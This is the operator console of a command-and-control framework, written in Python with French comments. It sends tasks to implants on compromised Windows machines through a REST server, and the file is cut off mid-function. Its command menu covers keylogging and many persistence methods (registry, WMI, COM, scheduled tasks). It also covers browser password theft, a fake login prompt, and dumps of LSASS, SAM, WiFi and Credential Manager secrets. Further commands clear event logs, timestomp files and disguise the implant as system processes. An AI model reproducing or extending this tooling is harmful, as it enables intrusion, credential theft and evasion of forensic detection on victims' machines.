"""
Interface console interactive pour l'administration réseau.

Ce module fournit une interface en ligne de commande (CLI) permettant à un
opérateur de gérer les clients connectés, envoyer des commandes, et consulter
les statistiques du serveur d'administration.

L'interface communique avec le serveur Flask via HTTP REST API.

Exemple d'utilisation:
    >>> python cli.py
    >>> python cli.py --server http://192.168.56.1:8080
"""

import argparse
import json
import os
import sys
import time
import base64
from typing import Any, Dict, List, Optional

import requests
from colorama import Fore, Style, init as colorama_init

# Initialisation colorama pour Windows
colorama_init(autoreset=True)

# Configuration par défaut
DEFAULT_SERVER_URL = "http://localhost:8080"
REQUEST_TIMEOUT = 5  # secondes

# Types de commandes disponibles
COMMAND_TYPES = {
    # === COMMANDES DE BASE ===
    "1": ("shell", "👤 Exécuter une commande système"),
    "2": ("keylog_start", "👤 Démarrer le keylogger"),
    "3": ("keylog_stop", "👤 Arrêter le keylogger"),
    "4": ("keylog_dump", "👤 Récupérer les logs clavier"),
    "5": ("persist_install", "👤 Installer la persistance"),
    "6": ("persist_remove", "👤 Supprimer la persistance"),
    "7": ("screenshot", "👤 Capture d'écran"),
    "8": ("upload", "👤 Upload fichier (client → serveur)"),
    "9": ("download", "👤 Download fichier (serveur → client)"),
    "10": ("terminate", "👤 Arrêter l'implant"),
    # === COMMANDES PROCESSUS ===
    "11": ("ps", "👤 Lister tous les processus"),
    "12": ("psfind", "👤 Chercher un processus par nom"),
    "13": ("detect_av", "👤 Détecter les logiciels de sécurité"),
    # === COMMANDES SYSINFO (Reconnaissance) ===
    "14": ("sysinfo", "👤 📊 Rapport système COMPLET"),
    "15": ("osinfo", "👤 Informations OS"),
    "16": ("hwinfo", "👤 Informations hardware (CPU, RAM, disques)"),
    "17": ("netinfo", "👤 Informations réseau"),
    "18": ("userinfo", "👤 Informations utilisateurs"),
    "19": ("software", "👤 Logiciels installés"),
    "20": ("services", "👤 Services en cours"),
    "21": ("startup", "👤 Programmes au démarrage"),
    "22": ("security", "👤 Statut sécurité (UAC, Firewall, Defender)"),
    "23": ("connections", "👤 Connexions réseau actives"),
    "24": ("uptime", "👤 Temps de fonctionnement"),
    "25": ("domain", "👤 Informations domaine/workgroup"),
    "26": ("env", "👤 Variables d'environnement"),
    "27": ("shares", "👤 Partages réseau"),
    # === COMMANDES FILE BROWSER ===
    "28": ("ls", "👤 📁 Lister un répertoire distant"),
    "29": ("cat", "👤 📄 Lire un fichier distant"),
    "30": ("search", "👤 🔍 Rechercher des fichiers"),
    "31": ("drives", "👤 💾 Lister les lecteurs"),
    # === COMMANDES CLEANUP ===
    "32": ("cleanup", "👤 🧹 Nettoyage complet des traces"),
    "33": ("cleanup_prefetch", "👤 🗑️ Nettoyer le prefetch"),
    "34": ("cleanup_recent", "👤 🗑️ Nettoyer les fichiers récents"),
    "35": ("cleanup_logs", "👤 🗑️ Nettoyer les logs Windows"),
    "36": ("timestomp", "👤 ⏰ Modifier les timestamps d'un fichier"),
    "37": ("selfdestruct", "👤 💣 Auto-destruction complète"),
    # === COMMANDES PERSISTANCE AVANCÉE ===
    "38": ("wmi_install", "👑 Installer persistance WMI"),
    "39": ("wmi_remove", "👑 Supprimer persistance WMI"),
    "40": ("wmi_check", "👑 Vérifier persistance WMI"),
    "41": ("com_install", "👤 🔌 Installer persistance COM"),
    "42": ("com_remove", "👤 🔌 Supprimer persistance COM"),
    "43": ("com_check", "👤 🔌 Vérifier persistance COM"),
    # === COMMANDES D'ÉLÉVATION ===
    "44": ("request_elevation", "👤 👑 Demander élévation de privilèges"),
    # === COMMANDES DE MIGRATION ===
    "45": ("migrate", "👤 🔄 Migrer vers un autre processus"),
    "46": ("uninstall_user", "👤 Désinstaller l'agent (user)"),
    "47": ("uninstall_admin", "👑 Désinstaller l'agent (admin - TOUT)"),
    "48": ("watchdog_stop", "👤 ⏹️ Arrêter le watchdog"),
    "49": ("task_install", "👑 Installer persistence Scheduled Task"),
    "50": ("task_remove", "👑 Supprimer persistence Scheduled Task"),
    "51": ("task_check", "👤 Vérifier persistence Scheduled Task"),
    "52": ("persist_status", "👤 Voir statut de toutes les persistances"),
    "53": ("persist_all", "👑 Installer TOUTES les persistances"),
    "54": ("persist_remove_all", "👑 Supprimer TOUTES les persistances"),
    "55": ("persist_repair", "👑 Réparer les persistances manquantes"),
    "56": ("browser_harvest", "👤 Voler mots de passe navigateurs"),
    "57": ("fake_login", "👤 🔐 Fake Login Prompt (capture credentials)"),
    "58": ("dump_wifi", "👤 📶 Récupérer mots de passe WiFi"),
    "59": ("dump_credentials", "👤 🔑 Récupérer Windows Credential Manager"),
    "60": ("dump_lsass", "👑 🧠 Dump LSASS (hashes/passwords)"),
    "61": ("dump_all", "👑 💀 Dump ALL credentials (LSASS+WiFi+Creds)"),
    "62": ("dump_sam", "👑 🗄️ Dump SAM (hashes NTLM via esentutl)"),
}


class C2Console:
    """
    Interface console interactive pour l'administration du serveur C2.

    Cette classe fournit un menu interactif permettant de gérer les clients,
    envoyer des commandes et consulter les statistiques via l'API REST du serveur.

    Attributes:
        server_url: URL du serveur C2 (ex: "http://localhost:8080").
        running: Flag indiquant si le CLI est en cours d'exécution.

    Exemple:
        >>> console = C2Console("http://localhost:8080")
        >>> console.run()
    """

    def __init__(self, server_url: str = DEFAULT_SERVER_URL) -> None:
        """
        Initialise la console d'administration.

        Args:
            server_url: URL du serveur C2 (défaut: http://localhost:8080).
        """
        self.server_url = server_url.rstrip("/")
        self.running = True

    def run(self) -> None:
        """
        Boucle principale du CLI.

        Affiche le menu et traite les choix de l'utilisateur jusqu'à ce qu'il quitte.
        """
        self._clear_screen()
        print(f"{Fore.CYAN}🔗 Connexion au serveur: {self.server_url}{Style.RESET_ALL}")

        # Vérifier la connexion au serveur
        if not self._check_server_connection():
            print(f"\n{Fore.RED}❌ Impossible de se connecter au serveur.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Vérifiez que le serveur est démarré et accessible.{Style.RESET_ALL}")
            sys.exit(1)

        print(f"{Fore.GREEN}✅ Connexion établie{Style.RESET_ALL}\n")
        time.sleep(1)

        while self.running:
            self._clear_screen()
            self.display_menu()

            try:
                choice = input(f"\n{Fore.CYAN}Votre choix: {Style.RESET_ALL}").strip()

                if choice == "1":
                    self.list_clients()
                elif choice == "2":
                    self.send_command()
                elif choice == "3":
                    self.view_results()
                elif choice == "4":
                    self.show_stats()
                elif choice == "5":
                    continue  # Rafraîchir (réaffiche le menu)
                elif choice == "6":
                    self.list_uploaded_files()
                elif choice == "0":
                    self.running = False
                    print(f"\n{Fore.GREEN}👋 Au revoir!{Style.RESET_ALL}")
                else:
                    print(f"\n{Fore.RED}❌ Choix invalide. Veuillez saisir un numéro entre 0 et 6.{Style.RESET_ALL}")
                    self._wait_for_enter()

            except KeyboardInterrupt:
                print(f"\n\n{Fore.YELLOW}⚠️  Interruption détectée{Style.RESET_ALL}")
                self.running = False
            except Exception as e:
                print(f"\n{Fore.RED}❌ Erreur inattendue: {e}{Style.RESET_ALL}")
                self._wait_for_enter()

    def display_menu(self) -> None:
        """
        Affiche le menu principal de l'interface.
        """
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Style.RESET_ALL}          🖥️  C2 ADMINISTRATION CONSOLE                       {Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╠══════════════════════════════════════════════════════════════╣{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Style.RESET_ALL}  [1] 📋 Lister les clients                                   {Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Style.RESET_ALL}  [2] 📡 Envoyer une commande                                 {Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Style.RESET_ALL}  [3] 📊 Voir les résultats                                   {Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Style.RESET_ALL}  [4] 📈 Statistiques serveur                                 {Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Style.RESET_ALL}  [5] 🔄 Rafraîchir                                           {Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Style.RESET_ALL}  [6] 📁 Fichiers uploadés                                    {Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Style.RESET_ALL}  [0] 🚪 Quitter                                              {Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")

    def list_clients(self) -> None:
        """
        Affiche la liste de tous les clients connectés au serveur.

        Récupère les clients via GET /clients et les affiche dans un tableau formaté.
        """
        print(f"\n{Fore.BLUE}📋 CLIENTS CONNECTÉS{Style.RESET_ALL}")
        print("=" * 100)

        response = self._make_request("GET", "/clients")
        if not response:
            return

        clients = response.get("clients", [])

        if not clients:
            print(f"\n{Fore.YELLOW}ℹ️  Aucun client connecté.{Style.RESET_ALL}")
            self._wait_for_enter()
            return

        # Préparer les données du tableau
        headers = ["Client ID", "Hostname", "IP", "OS", "Status", "Dernier vu"]
        rows = []

        for client in clients:
            # Tronquer le client_id pour l'affichage
            client_id_short = client["client_id"][:30] + "..."

            # Badge de privilèges
            is_admin = client.get("is_admin", False)
            privilege_badge = f"{Fore.YELLOW}👑 ADMIN{Style.RESET_ALL}" if is_admin else f"{Fore.CYAN}🔒 USER{Style.RESET_ALL}"
            hostname_with_badge = f"{privilege_badge} {client['hostname']}"

            # Déterminer le status avec emoji
            status = client.get("status", "unknown")
            if status == "active":
                status_display = f"{Fore.GREEN}🟢 active{Style.RESET_ALL}"
            else:
                status_display = f"{Fore.RED}🔴 {status}{Style.RESET_ALL}"

            # Extraire la date du dernier vu (format ISO)
            last_seen = client.get("last_seen", "N/A")
            if last_seen != "N/A":
                # Garder uniquement la date et l'heure (sans millisecondes)
                last_seen = last_seen.split(".")[0].replace("T", " ")

            rows.append([
                client_id_short,
                hostname_with_badge,
                client["ip"],
                client["os"],
                status_display,
                last_seen
            ])

        self._print_table(headers, rows)

        # Statistiques
        active_count = sum(1 for c in clients if c.get("status") == "active")
        inactive_count = len(clients) - active_count

        print(f"\n{Fore.CYAN}Total: {len(clients)} client(s){Style.RESET_ALL} | ", end="")
        print(f"{Fore.GREEN}Actifs: {active_count}{Style.RESET_ALL} | ", end="")
        print(f"{Fore.RED}Inactifs: {inactive_count}{Style.RESET_ALL}")

        self._wait_for_enter()

    def send_command(self) -> None:
        """
        Interface interactive d'envoi de commande à un client.

        Workflow:
        1. Liste les clients et demande une sélection
        2. Affiche les types de commandes disponibles
        3. Demande les paramètres selon le type
        4. Envoie la commande via POST /command
        """
        print(f"\n{Fore.BLUE}📡 ENVOI DE COMMANDE{Style.RESET_ALL}")
        print("=" * 100)

        # 1. Récupérer la liste des clients
        response = self._make_request("GET", "/clients")
        if not response:
            return

        clients = response.get("clients", [])

        if not clients:
            print(f"\n{Fore.YELLOW}ℹ️  Aucun client connecté. Impossible d'envoyer une commande.{Style.RESET_ALL}")
            self._wait_for_enter()
            return

        # 2. Afficher la liste numérotée
        print(f"\n{Fore.CYAN}Clients disponibles:{Style.RESET_ALL}")
        for i, client in enumerate(clients, 1):
            status = "🟢" if client.get("status") == "active" else "🔴"
            is_admin = client.get("is_admin", False)
            privilege_badge = f"{Fore.YELLOW}👑{Style.RESET_ALL}" if is_admin else f"{Fore.CYAN}🔒{Style.RESET_ALL}"
            print(f"  [{i}] {status} {privilege_badge} {client['hostname']} ({client['ip']}) - {client['os']}")

        # 3. Sélection du client
        try:
            client_choice = input(f"\n{Fore.CYAN}Sélectionnez un client (1-{len(clients)}) ou 0 pour annuler: {Style.RESET_ALL}").strip()
            if client_choice == "0":
                return

            client_index = int(client_choice) - 1
            if client_index < 0 or client_index >= len(clients):
                print(f"{Fore.RED}❌ Choix invalide.{Style.RESET_ALL}")
                self._wait_for_enter()
                return

            selected_client = clients[client_index]

        except ValueError:
            print(f"{Fore.RED}❌ Veuillez entrer un numéro valide.{Style.RESET_ALL}")
            self._wait_for_enter()
            return

        # 4. Afficher les types de commandes
        print(f"\n{Fore.CYAN}Types de commandes disponibles:{Style.RESET_ALL}")
        for key, (cmd_type, description) in COMMAND_TYPES.items():
            print(f"  [{key.ljust(2)}] {cmd_type.ljust(16)} - {description}")

        # 5. Sélection du type de commande
        cmd_choice = input(f"\n{Fore.CYAN}Sélectionnez un type de commande (1-62) ou 0 pour annuler: {Style.RESET_ALL}").strip()
        if cmd_choice == "0":
            return

        if cmd_choice not in COMMAND_TYPES:
            print(f"{Fore.RED}❌ Type de commande invalide.{Style.RESET_ALL}")
            self._wait_for_enter()
            return

        task_type, description = COMMAND_TYPES[cmd_choice]

        # 6. Demander les paramètres selon le type
        params = {}

        if task_type == "shell":
            command = input(f"{Fore.CYAN}Commande à exécuter: {Style.RESET_ALL}").strip()
            if not command:
                print(f"{Fore.RED}❌ Commande vide, annulation.{Style.RESET_ALL}")
                self._wait_for_enter()
                return
            params = {"command": command}

        elif task_type == "psfind":
            process_name = input(f"{Fore.CYAN}Nom du processus à chercher: {Style.RESET_ALL}").strip()
            if not process_name:
                print(f"{Fore.RED}❌ Nom vide, annulation.{Style.RESET_ALL}")
                self._wait_for_enter()
                return
            params = {"command": process_name}

        elif task_type == "upload":
            filepath = input(f"{Fore.CYAN}Chemin du fichier sur le client: {Style.RESET_ALL}").strip()
            if not filepath:
                print(f"{Fore.RED}❌ Chemin vide, annulation.{Style.RESET_ALL}")
                self._wait_for_enter()
                return
            params = {"filepath": filepath}

        elif task_type == "download":
            # Download : envoyer un fichier local vers le client
            local_file = input(f"{Fore.CYAN}Chemin du fichier local à envoyer: {Style.RESET_ALL}").strip()
            destination = input(f"{Fore.CYAN}Destination sur le client: {Style.RESET_ALL}").strip()

            if not local_file or not destination:
                print(f"{Fore.RED}❌ Paramètres incomplets, annulation.{Style.RESET_ALL}")
                self._wait_for_enter()
                return

            # Vérifier que le fichier local existe
            if not os.path.exists(local_file):
                print(f"{Fore.RED}❌ Fichier local introuvable: {local_file}{Style.RESET_ALL}")
                self._wait_for_enter()
                return

            # Vérifier la taille (max 10MB)
            file_size = os.path.getsize(local_file)
            if file_size > 10 * 1024 * 1024:
                print(f"{Fore.RED}❌ Fichier trop volumineux: {file_size} bytes (max 10MB){Style.RESET_ALL}")
                self._wait_for_enter()
                return

            # Lire et encoder le fichier en Base64
            try:
                with open(local_file, 'rb') as f:
                    file_content = f.read()
                base64_content = base64.b64encode(file_content).decode('utf-8')
                print(f"{Fore.GREEN}✅ Fichier lu: {local_file} ({file_size} bytes){Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}❌ Erreur lecture fichier: {e}{Style.RESET_ALL}")
                self._wait_for_enter()
                return

            # Le contenu Base64 est passé dans "command" pour être récupéré par l'implant
            params = {"command": base64_content, "destination": destination}

        elif task_type == "ls" or task_type == "dir":
            path = input(f"{Fore.CYAN}Chemin du répertoire (vide = C:\\): {Style.RESET_ALL}").strip()
            params = {"path": path} if path else {}

        elif task_type == "cat" or task_type == "type":
            filepath = input(f"{Fore.CYAN}Chemin complet du fichier: {Style.RESET_ALL}").strip()
            if not filepath:
                print(f"{Fore.RED}❌ Chemin vide, annulation.{Style.RESET_ALL}")
                self._wait_for_enter()
                return
            params = {"file": filepath}

        elif task_type == "search":
            pattern = input(f"{Fore.CYAN}Pattern de recherche (ex: *.txt, pass*, config.*): {Style.RESET_ALL}").strip()
            if not pattern:
                print(f"{Fore.RED}❌ Pattern vide, annulation.{Style.RESET_ALL}")
                self._wait_for_enter()
                return
            startpath = input(f"{Fore.CYAN}Chemin de départ (vide = C:\\Users\\): {Style.RESET_ALL}").strip()
            params = {"pattern": pattern}
            if startpath:
                params["path"] = startpath

        elif task_type == "cleanup":
            # Nettoyage complet - pas de paramètres
            print(f"{Fore.YELLOW}⚠️  Cette commande va effacer toutes les traces système:{Style.RESET_ALL}")
            print(f"   • Prefetch files")
            print(f"   • Fichiers récents")
            print(f"   • Event logs Windows (Security, System, Application)")
            confirm = input(f"\n{Fore.RED}Confirmer le nettoyage complet? (o/N): {Style.RESET_ALL}").strip().lower()
            if confirm != "o":
                print(f"{Fore.YELLOW}❌ Nettoyage annulé.{Style.RESET_ALL}")
                self._wait_for_enter()
                return
            params = {}

        elif task_type == "cleanup_prefetch":
            # Nettoyage prefetch uniquement
            print(f"{Fore.YELLOW}ℹ️  Cette commande nécessite des privilèges administrateur.{Style.RESET_ALL}")
            params = {}

        elif task_type == "cleanup_recent":
            # Nettoyage fichiers récents
            params = {}

        elif task_type == "cleanup_logs":
            # Nettoyage event logs
            print(f"{Fore.YELLOW}⚠️  Cette commande nécessite des privilèges administrateur.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}⚠️  Effacer les event logs est très suspect et sera détecté.{Style.RESET_ALL}")
            confirm = input(f"\n{Fore.RED}Confirmer l'effacement des event logs? (o/N): {Style.RESET_ALL}").strip().lower()
            if confirm != "o":
                print(f"{Fore.YELLOW}❌ Nettoyage annulé.{Style.RESET_ALL}")
                self._wait_for_enter()
                return
            params = {}

        elif task_type == "timestomp":
            # Timestomping - modifier les timestamps
            filepath = input(f"{Fore.CYAN}Chemin du fichier à modifier: {Style.RESET_ALL}").strip()
            if not filepath:
                print(f"{Fore.RED}❌ Chemin vide, annulation.{Style.RESET_ALL}")
                self._wait_for_enter()
                return

            print(f"\n{Fore.CYAN}Date/heure à appliquer (format: YYYY-MM-DD HH:MM:SS){Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Exemples:{Style.RESET_ALL}")
            print(f"  • 2020-01-01 12:00:00")
            print(f"  • 2024-06-15 08:30:45")
            date = input(f"\n{Fore.CYAN}Date: {Style.RESET_ALL}").strip()

            if not date:
                print(f"{Fore.RED}❌ Date vide, annulation.{Style.RESET_ALL}")
                self._wait_for_enter()
                return

            params = {"filepath": filepath, "date": date}

        elif task_type == "selfdestruct":
            # Auto-destruction
            print(f"{Fore.RED}{'='*60}{Style.RESET_ALL}")
            print(f"{Fore.RED}⚠️  ATTENTION: AUTO-DESTRUCTION DE L'IMPLANT{Style.RESET_ALL}")
            print(f"{Fore.RED}{'='*60}{Style.RESET_ALL}")
            print(f"\n{Fore.YELLOW}Cette commande va:{Style.RESET_ALL}")
            print(f"  1. Supprimer la persistance (registre)")
            print(f"  2. Créer un script batch temporaire")
            print(f"  3. Supprimer le binaire de l'implant")
            print(f"  4. Supprimer le script batch")
            print(f"\n{Fore.RED}⚠️  LE CLIENT NE SERA PLUS ACCESSIBLE APRÈS CETTE COMMANDE{Style.RESET_ALL}")

            confirm1 = input(f"\n{Fore.RED}Êtes-vous ABSOLUMENT SÛR? (tapez 'OUI' en majuscules): {Style.RESET_ALL}").strip()
            if confirm1 != "OUI":
                print(f"{Fore.YELLOW}❌ Auto-destruction annulée.{Style.RESET_ALL}")
                self._wait_for_enter()
                return

            confirm2 = input(f"{Fore.RED}Dernière confirmation (tapez 'CONFIRME'): {Style.RESET_ALL}").strip()
            if confirm2 != "CONFIRME":
                print(f"{Fore.YELLOW}❌ Auto-destruction annulée.{Style.RESET_ALL}")
                self._wait_for_enter()
                return

            params = {}

        elif task_type == "request_elevation":
            # Demande d'élévation - pas de paramètres
            print(f"{Fore.YELLOW}ℹ️  Cette commande va afficher une boîte de dialogue UAC sur le client.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}ℹ️  L'utilisateur devra accepter l'élévation pour que l'implant obtienne les droits admin.{Style.RESET_ALL}")
            params = {}

        elif task_type == "migrate":
            # Migration de processus
            print(f"\n{Fore.CYAN}📦 MIGRATION DE PROCESSUS{Style.RESET_ALL}")
            print("=" * 50)
            print(f"{Fore.YELLOW}Cette commande va :{Style.RESET_ALL}")
            print(f"  1. Copier l'agent avec un nom de service Windows légitime")
            print(f"  2. Le déployer dans un dossier système caché")
            print(f"  3. Lancer le nouveau processus")
            print(f"\n{Fore.CYAN}Noms possibles :{Style.RESET_ALL} RuntimeBroker.exe, SecurityHealthService.exe,")
            print(f"                 SearchProtocolHost.exe, backgroundTaskHost.exe, WmiPrvSE.exe")
            print()

            params = {"command": "auto"}  # Valeur ignorée côté agent

        elif task_type == "uninstall_user":
            # Désinstallation version user
            print(f"\n{Fore.CYAN}🗑️  DÉSINSTALLATION (USER){Style.RESET_ALL}")
            print("=" * 50)
            print(f"{Fore.YELLOW}Cette commande va supprimer :{Style.RESET_ALL}")
            print(f"  - Clés de registre HKCU (Run, COM)")
            print(f"  - Fichiers déployés dans AppData")
            print()

            params = {"command": "uninstall"}

        elif task_type == "uninstall_admin":
            # Désinstallation version admin
            print(f"\n{Fore.RED}🗑️  DÉSINSTALLATION COMPLÈTE (ADMIN){Style.RESET_ALL}")
            print("=" * 50)
            print(f"{Fore.RED}⚠️  Nécessite les droits administrateur!{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Cette commande va supprimer TOUT :{Style.RESET_ALL}")
            print(f"  - Clés de registre HKCU et HKLM")
            print(f"  - Tâches planifiées")
            print(f"  - WMI Event Subscriptions")
            print(f"  - Fichiers déployés")
            print()

            params = {"command": "uninstall"}

        # 7. Confirmation
        print(f"\n{Fore.YELLOW}📋 Récapitulatif:{Style.RESET_ALL}")
        print(f"   Client:  {selected_client['hostname']} ({selected_client['client_id'][:16]}...)")
        print(f"   Type:    {task_type}")
        print(f"   Params:  {params if params else 'Aucun'}")

        confirm = input(f"\n{Fore.CYAN}Confirmer l'envoi? (o/N): {Style.RESET_ALL}").strip().lower()
        if confirm != "o":
            print(f"{Fore.YELLOW}⚠️  Commande annulée.{Style.RESET_ALL}")
            self._wait_for_enter()
            return

        # 8. Envoi de la commande
        payload = {
            "client_id": selected_client["client_id"],
            "task_type": task_type,
            "params": params
        }

        response = self._make_request("POST", "/command", data=payload)
        if response:
            task_id = response.get("task_id", "N/A")
            print(f"\n{Fore.GREEN}✅ Commande envoyée avec succès!{Style.RESET_ALL}")
            print(f"{Fore.CYAN}Task ID: {task_id}{Style.RESET_ALL}")

            # 9. Attente automatique du résultat
            print(f"\n{Fore.YELLOW}⏳ En attente du résultat...{Style.RESET_ALL}")
            result = self._wait_for_result(task_id, timeout=60)

            if result:
                print(f"\n{Fore.GREEN}✅ Résultat reçu:{Style.RESET_ALL}")
                self._display_single_result(result)
            else:
                print(f"\n{Fore.YELLOW}⏱️  Timeout: Le résultat n'est pas arrivé dans les 60 secondes.{Style.RESET_ALL}")
                print(f"{Fore.CYAN}ℹ️  Vous pourrez consulter le résultat plus tard via l'option [3] du menu.{Style.RESET_ALL}")

        self._wait_for_enter()

    def view_results(self) -> None:
        """
        Affiche la liste des résultats avec sélection interactive.
        Permet de voir le contenu complet d'un résultat ou de l'exporter.
        """
        print(f"\n{Fore.BLUE}📊 RÉSULTATS DES COMMANDES{Style.RESET_ALL}")
        print("=" * 100)

        response = self._make_request("GET", "/results")
        if not response:
            return

        results = response.get("results", [])
        count = response.get("count", 0)

        if count == 0:
            print(f"\n{Fore.YELLOW}ℹ️  Aucun résultat disponible.{Style.RESET_ALL}")
            self._wait_for_enter()
            return

        print(f"\n{Fore.CYAN}Total: {count} résultat(s){Style.RESET_ALL}\n")

        # Afficher la liste numérotée des résultats
        for i, result in enumerate(results, 1):
            task_id = result.get("task_id", "N/A")[:12] + "..."
            status = result.get("status", "unknown")
            output = result.get("output", "")
            received_at = result.get("received_at", "N/A")

            # Emoji selon status
            status_emoji = "✅" if status == "success" else "❌"
            status_color = Fore.GREEN if status == "success" else Fore.RED

            # Extraire le type de commande (première ligne si présent dans l'output)
            output_preview = output[:50].replace("\n", " ")
            if output.startswith("[FILE_DATA]"):
                output_preview = "📁 Upload fichier"
            elif output.startswith("[SCREENSHOT"):
                output_preview = "📸 Screenshot"

            # Taille de l'output
            lines_count = output.count("\n") + 1
            chars_count = len(output)
            size_str = f"{lines_count}L {chars_count}C"

            # Date formatée (gérer float timestamp, string ISO, ou N/A)
            if isinstance(received_at, (int, float)):
                # Timestamp Unix - convertir en string
                date_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(received_at))
            elif isinstance(received_at, str) and "T" in received_at:
                # Format ISO 8601
                date_str = received_at.split("T")[0] + " " + received_at.split("T")[1][:8]
            else:
                # Autre format ou N/A
                date_str = str(received_at) if received_at else "N/A"

            print(f"  [{i:2d}] {status_color}{status_emoji}{Style.RESET_ALL} {task_id} | {size_str:12s} | {date_str} | {output_preview}...")

        # Menu d'actions
        print(f"\n{Fore.CYAN}Actions:{Style.RESET_ALL}")
        print(f"  • Entrez un numéro (1-{count}) pour voir le résultat complet")
        print(f"  • Entrez 0 pour retourner au menu principal")

        choice = input(f"\n{Fore.CYAN}Votre choix: {Style.RESET_ALL}").strip()

        if choice == "0":
            return

        try:
            result_index = int(choice) - 1
            if 0 <= result_index < count:
                selected_result = results[result_index]
                self._display_full_result(selected_result)
            else:
                print(f"{Fore.RED}❌ Numéro invalide.{Style.RESET_ALL}")
                self._wait_for_enter()
        except ValueError:
            print(f"{Fore.RED}❌ Veuillez entrer un numéro valide.{Style.RESET_ALL}")
            self._wait_for_enter()

    def list_uploaded_files(self) -> None:
        """
        Affiche la liste des fichiers uploadés par les clients.
        """
        print(f"\n{Fore.BLUE}📁 FICHIERS UPLOADÉS{Style.RESET_ALL}")
        print("=" * 100)

        response = self._make_request("GET", "/files")
        if not response:
            return

        files = response.get("files", [])
        count = response.get("count", 0)

        if count == 0:
            print(f"\n{Fore.YELLOW}ℹ️  Aucun fichier uploadé.{Style.RESET_ALL}")
            self._wait_for_enter()
            return

        print(f"\n{Fore.CYAN}Total: {count} fichier(s){Style.RESET_ALL}\n")

        headers = ["#", "Nom du fichier", "Taille", "Date"]
        rows = []

        for i, f in enumerate(files, 1):
            size_kb = f.get("size", 0) / 1024
            if size_kb > 1024:
                size_str = f"{size_kb/1024:.2f} MB"
            else:
                size_str = f"{size_kb:.2f} KB"

            modified = f.get("modified", "N/A")
            if modified != "N/A":
                modified = modified.split("T")[0] + " " + modified.split("T")[1][:8]

            rows.append([str(i), f.get("filename", "N/A"), size_str, modified])

        self._print_table(headers, rows)

        print(f"\n{Fore.CYAN}📂 Dossier: c2_server/uploads/{Style.RESET_ALL}")
        self._wait_for_enter()

    def show_stats(self) -> None:
        """
        Affiche les statistiques détaillées du serveur.

        Récupère les stats via GET / et les affiche de manière formatée.
        """
        print(f"\n{Fore.BLUE}📈 STATISTIQUES SERVEUR{Style.RESET_ALL}")
        print("=" * 100)

        response = self._make_request("GET", "/")
        if not response:
            return

        # Stats clients
        client_stats = response.get("clients", {})
        print(f"\n{Fore.CYAN}🖥️  Clients{Style.RESET_ALL}")
        print(f"   • Total:    {client_stats.get('total', 0)}")
        print(f"   • {Fore.GREEN}Actifs:   {client_stats.get('active', 0)}{Style.RESET_ALL}")
        print(f"   • {Fore.RED}Inactifs: {client_stats.get('inactive', 0)}{Style.RESET_ALL}")

        # Stats tâches
        tasks_stats = response.get("tasks", {})
        print(f"\n{Fore.CYAN}📋 Tâches{Style.RESET_ALL}")
        print(f"   • {Fore.YELLOW}Pending:   {tasks_stats.get('pending', 0)}{Style.RESET_ALL}")
        print(f"   • {Fore.CYAN}Sent:      {tasks_stats.get('sent', 0)}{Style.RESET_ALL}")
        print(f"   • {Fore.GREEN}Completed: {tasks_stats.get('completed', 0)}{Style.RESET_ALL}")
        print(f"   • {Fore.RED}Failed:    {tasks_stats.get('failed', 0)}{Style.RESET_ALL}")
        print(f"   • {Fore.MAGENTA}Timeout:   {tasks_stats.get('timeout', 0)}{Style.RESET_ALL}")

        print(f"\n{Fore.CYAN}📦 Résultats stockés: {tasks_stats.get('total_results', 0)}{Style.RESET_ALL}")

        print("\n" + "=" * 100)

        self._wait_for_enter()

    def _wait_for_result(self, task_id: str, timeout: int = 60) -> Optional[Dict[str, Any]]:
        """
        Attend qu'un résultat soit disponible pour un task_id donné.
        Polling toutes les 2 secondes avec timeout.

        Args:
            task_id: ID de la tâche à surveiller
            timeout: Timeout en secondes (défaut: 60)

        Returns:
            Dictionnaire du résultat ou None si timeout
        """
        start_time = time.time()
        poll_interval = 2  # secondes

        while (time.time() - start_time) < timeout:
            # Récupérer tous les résultats (silent pour éviter spam d'erreurs)
            response = self._make_request("GET", "/results", silent=True)
            if response:
                results = response.get("results", [])
                # Chercher le task_id
                for result in results:
                    if result.get("task_id") == task_id:
                        return result

            # Afficher un point pour indiquer l'attente
            print(".", end="", flush=True)
            time.sleep(poll_interval)

        print()  # Nouvelle ligne après les points
        return None

    def _display_single_result(self, result: Dict[str, Any]) -> None:
        """
        Affiche un seul résultat de manière compacte après envoi de commande.

        Args:
            result: Dictionnaire contenant le résultat
        """
        status = result.get("status", "unknown")
        output = result.get("output", "")

        # Emoji selon status
        status_emoji = "✅" if status == "success" else "❌"
        status_color = Fore.GREEN if status == "success" else Fore.RED

        print(f"  Status: {status_color}{status_emoji} {status}{Style.RESET_ALL}")

        # Afficher l'output complet avec pagination si nécessaire
        lines = output.split("\n")
        print(f"  Output ({len(lines)} lignes, {len(output)} caractères):")

        if len(lines) <= 50:
            # Affichage direct si petit
            for line in lines:
                print(f"    {line}")
        else:
            # Pagination pour les gros outputs
            self._paginate_output(lines)

    def _display_full_result(self, result: Dict[str, Any]) -> None:
        """
        Affiche un résultat complet avec toutes les métadonnées et option d'export.

        Args:
            result: Dictionnaire contenant le résultat
        """
        self._clear_screen()
        print(f"\n{Fore.BLUE}📄 DÉTAILS DU RÉSULTAT{Style.RESET_ALL}")
        print("=" * 100)

        task_id = result.get("task_id", "N/A")
        client_id = result.get("client_id", "N/A")
        status = result.get("status", "unknown")
        output = result.get("output", "")
        received_at = result.get("received_at", "N/A")
        error_message = result.get("error_message")

        # Emoji selon status
